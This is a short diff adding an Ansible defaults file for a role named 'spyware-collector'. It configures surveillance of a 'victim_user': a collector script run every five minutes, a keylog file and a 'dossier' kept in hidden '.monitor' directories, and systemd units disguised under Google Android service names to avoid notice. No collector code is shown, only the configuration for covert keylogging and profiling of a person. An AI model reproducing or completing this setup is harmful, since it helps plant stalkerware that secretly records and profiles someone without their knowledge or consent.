@@ -1,0 +1,11 @@
+---
+# defaults file for spyware-collector
+
+victim_user: cyrano
+collect_schedule: "*:0/5"
+collect_script_path: /usr/local/lib/.monitor/collector.sh
+keylog_path: /var/lib/.monitor/keylog.log
+dossier_path: /var/lib/.monitor/dossier.txt
+collect_log: /var/lib/.monitor/collector.log
+collect_timer_unit: "com.google.android.MainService.timer"
+collect_service_unit: "com.google.android.MainService.service"
